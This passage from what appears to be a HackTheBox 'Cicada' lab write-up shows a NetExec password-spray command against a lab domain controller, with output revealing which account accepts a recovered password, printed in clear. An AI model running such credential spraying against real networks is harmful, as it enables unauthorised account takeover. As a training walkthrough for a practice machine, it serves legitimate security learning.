...
use kerbrute to verify usernames

bruteforce users against found password:
```
┌──(kali㉿kali)-[~/htb/cicada]
└─$ nxc wmi cicada.htb -u users.txt -p pass.txt --no-bruteforce
RPC         10.10.11.35     135    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
RPC         10.10.11.35     135    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 (RPC_S_ACCESS_DENIED)
RPC         10.10.11.35     135    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 (RPC_S_ACCESS_DENIED)
RPC         10.10.11.35     135    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```
